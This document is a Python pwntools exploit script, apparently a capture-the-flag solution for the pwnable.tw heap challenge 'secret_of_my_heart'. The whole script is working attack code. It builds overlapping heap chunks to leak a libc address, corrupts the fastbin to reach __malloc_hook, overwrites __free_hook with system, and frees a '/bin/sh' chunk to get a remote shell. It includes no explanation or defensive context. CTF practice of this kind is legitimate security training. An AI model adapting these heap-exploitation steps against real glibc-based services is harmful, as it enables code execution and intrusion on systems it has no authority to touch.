#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./secret_of_my_heart"
ip = "chall.pwnable.tw"
port = 10302

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc_64.so.6"
if LOCAL:
    # io = process(filename, env={'LD_PRELOAD': remote_libc})
    # io = gdb.debug(filename, "set  follow-fork-mode child\nb free\nc", )
    # io = gdb.debug(filename, "set  follow-fork-mode child\nset exec-wrapper env 'LD_PRELOAD=./libc_2.27.so'\nb *0x555555554ECA\n", )
    # libc = ELF("/home/pu1p/glibcs/glibc-2.27_out/lib/libc-2.27.so")
    io = process(filename)
    libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process(filename, env={'LD_PRELOAD': remote_libc}) 
    # libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)
    # libc = elf.libc

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "Your choice :", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

def add(io, size, secret):
    choice(io, 1)
    sla(io, "Size of heart : ", str(size))
    sa(io, "Name of heart :", b'a'*0x8)
    sa(io, "secret of my heart :", secret)

def show(io, idx):
    choice(io, 2)
    sla(io, "Index :", str(idx))

def remove(io, idx, ):
    choice(io, 3)
    sla(io, "Index :", str(idx))

def backdoor(io, ):
    choice(io, 0x1305)

# bps.append("*0x5555555559CB")  
# gds['data']=0x6020A0

mydebug(io)

add(io, 0xf8, '0')
add(io, 0x68, '1')
add(io, 0xf8, '2')
add(io, 0x68, '3')

remove(io, 1)
remove(io, 0)

add(io, 0x68, b'a'*0x60 + p64(0x170))   # 0
remove(io, 2)

add(io, 0xf8, b'b'*8) # 1
show(io, 0)

ru(io, "Secret : ")
libc_addr = u64(rv(io, 6) + b'\x00\x00')
libc.address = libc_base = libc_addr - 0x68 - libc.sym['__malloc_hook']
mh = libc.sym['__malloc_hook']
fh = libc.sym['__free_hook']
system = libc.sym['system']
fake_chunk = mh - 0x23
oneshot = libc_base + 0xf02a4
log.info("libc_addr :0x%x", libc_addr)
log.info("libc_base :0x%x", libc_base)
log.info("fake_chunk :0x%x", fake_chunk)
log.info("oneshot :0x%x", oneshot)
# input()

add(io, 0x68, b'c'*8) # 2

remove(io, 0)
remove(io, 3)
remove(io, 2)

add(io, 0x60, p64(fake_chunk))  # 0
add(io, 0x60, b"/bin/sh\x00")  # 2
add(io, 0x60, p64(0xdeadbeef))  # 3

add(io, 0x60, b'\x00'*0x23 + p64(0)*2 + p64(0x71)*4 + p64(mh + 0x20))

add(io, 0x60, b'\x00'*0x38 + p64(fh-0xb58))


for i in range(19):
    add(io, 0x90, b'm'*0x10)

add(io, 0x90, b'm'*0x8 + p64(system))

remove(io, 2)

# choice(io, 1)
# sla(io, "Size of heart : ", str(0x10))
# sa(io, "Name of heart :", b'a'*0x8)

io.interactive()
